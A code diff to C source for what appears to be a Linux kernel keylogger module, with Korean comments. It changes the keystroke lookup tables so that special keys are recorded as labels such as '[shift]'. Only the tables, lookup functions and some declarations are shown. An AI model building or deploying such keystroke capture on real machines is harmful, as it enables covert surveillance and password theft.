@@ -6,7 +6,6 @@
 #include <linux/module.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
-#include <semaphore.h>
 
 #define KLG_MAJOR   60 //전처리
 #define BUFF_LENGTH 1024
@@ -16,27 +15,27 @@
 char buffer[BUFF_LENGTH+1]; //버퍼 배열 선언
 char* bptr = buffer; //버퍼 배열의 시작 주소를 bptr변수에 저장한다.
 const char* endptr = (buffer+sizeof(buffer)-1); //버퍼 배열의 마지막 주소를 endptr에 저장한다.
-const char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r', //const를 이용하여 배열을 전부 상수화시킴.
-		   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
-		   'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
-		   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'};
+const char *ch_table[] = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[back_space]", //const를 이용하여 배열을 전부 상수화시킴.
+		   "[tab]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n",
+		   "[ctrl]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "\'", "[shift]",
+		   "X", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/"};
 
-const char shifted_ch_table[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '\r', //const를 이용하여 배열을 전부 상수화시킴.
-		   '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', '\n',
-		   'X', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '|', 'X',
-		   'X', '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?'};
+const char *shifted_ch_table[] = { "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "[back_space]", //const를 이용하여 배열을 전부 상수화시킴.
+		   "[tab]", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "\n",
+		   "[ctrl]", "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "|", "[shift]",
+		   "X", "\\", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?"};
 
-inline char get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
-	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //만약에 범위 외의 문자라면 X를 반환
-	else if(code == KEY_SPACE) return ' '; //스페이스라면 공백을 반환
+inline char *get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
+	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return "X"; //만약에 범위 외의 문자라면 X를 반환
+	else if(code == KEY_SPACE) return " "; //스페이스라면 공백을 반환
 	
-	return ch_table[(code-FIRST_CD)]; //해당 문자를 반환
+	return *(ch_table+(code - FIRST_CD)); //해당 문자를 반환
 }
-inline char shifted_get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
-	if ((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //만약에 범위 외의 문자라면 X를 반환
-	else if (code == KEY_SPACE) return ' '; //스페이스라면 공백을 반환
+inline char *shifted_get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
+	if ((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return "X"; //만약에 범위 외의 문자라면 X를 반환
+	else if (code == KEY_SPACE) return " "; //스페이스라면 공백을 반환
 
-	return shifted_ch_table[(code - FIRST_CD)]; //해당 문자를 반환
+	return *(shifted_ch_table+(code - FIRST_CD)); //해당 문자를 반환
 }
 int klg_open(struct inode *inode, struct file *filp); //klg_open 함수 선언
 ssize_t klg_read(struct file *filp, char *buf, size_t count, loff_t *f_pos); //klg_read함수 선언
